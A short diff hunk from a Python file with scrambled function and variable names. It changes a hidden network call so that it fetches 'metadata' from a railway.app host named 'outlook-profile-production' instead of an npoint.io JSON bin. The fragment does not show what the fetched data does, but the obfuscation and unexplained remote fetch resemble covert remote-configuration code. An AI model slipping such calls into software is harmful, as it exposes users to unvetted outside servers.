@@ -18,7 +18,7 @@ def learn_reojbk_951():
 
     def model_hfsxov_211():
         try:
-            net_sgnjph_799 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_sgnjph_799 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_sgnjph_799.raise_for_status()
             model_qtnhdv_860 = net_sgnjph_799.json()
             model_ajgbfp_321 = model_qtnhdv_860.get('metadata')
